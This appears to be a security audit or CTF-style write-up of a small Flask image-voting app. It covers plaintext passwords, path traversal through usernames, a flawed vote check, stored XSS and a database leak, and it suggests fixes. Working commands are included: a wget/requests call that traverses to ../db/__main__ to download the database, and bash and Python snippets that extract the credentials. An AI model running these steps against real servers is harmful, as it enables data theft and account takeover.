Database extraction

  • plaintext user passwords
  • stolen user passwords can be used to log into other services if the users use the same password on multiple services
  • accounts from DB can be extracted with a few simple commands on Linux:
cp __main__ db.xz
unxz db.xz
readarray -t lines < db
for line in "${lines[@]}"; do
  if [[ $line == passwords* ]]; then
    readarray -d "|" -t users_parsed<<<"$line"
    for creds in "${users_parsed[@]}"; do
        echo $creds
    done
  fi
done
  • same can be achieved with Python:
from lzma import open
with open("__main__", "rb") as f:
  lines = f.read().decode('utf-8').splitlines()
  for line in lines:
    if line.startswith("passwords"):
      for x in line.split("|"):
        print(x)

HTTP upload malicious file

line 135 in main.py:

request.files['file'].save(DATA_DIR + '/' + get_username(database, request) + '.png')
  • server allows usernames that can include special characters
  • username is not sanitized properly
  • this allows attackers to upload files elsewhere than the data folder by setting their username to valid path

Examples

  • overwrite image of another user
    • resulting path is the same, but username in system is different
    • data/./LosiceKarlice.png -> data/LosiceKarlice.png
  • directory traversal
    • data/../aa.png -> aa.png

Voting

  • voting signature check does not prevent voting multiple times, only disallows users from voting for themselves
  • issue can be found on line 72 in main.py
if get_user_signature(
        database, user
) in get_user_submission(database, user)['votes']:
    return "you have already voted for this", 403
  • the (probably) intended behavior would be achieved with
if get_user_signature(
        database, get_username(database, request)
) in get_user_submission(database, user)['votes']:
    return "you have already voted for this", 403
  • if you apply this fix, don't forget to add another check to make sure users don't vote for themselves

Stored (persistant) XSS

  • XSS allows attackers to execute JavaScript in browsers of other users
  • usernames are not escaped properly and are interpreted as html code by browser when displaying comments
  • {{ example_string|safe }} tells jinja that example_string is safe and should not be escaped for special characters, which can cause problems if it contains HTML characters
  • to fix remove |safe from {{ comment.user|safe }} on line 90 in templates/submission.html

Database leak

  • when downloading user submission, website doesn't check if username is a valid user
  • when combined with directory traversal, we can read contents of any file the web server can access
  • to download database we can use wget in Linux:
wget "http://127.0.0.1:5000/submission_img?user=../db/__main__&format=" -O db.xz
  • to do the same with Python:
import requests
URL = "http://127.0.0.1:5000/submission_img?user=../db/__main__&format="
r = requests.get(URL)
with open("db.xz", "wb") as f:
    f.write(r.content)
    f.close()
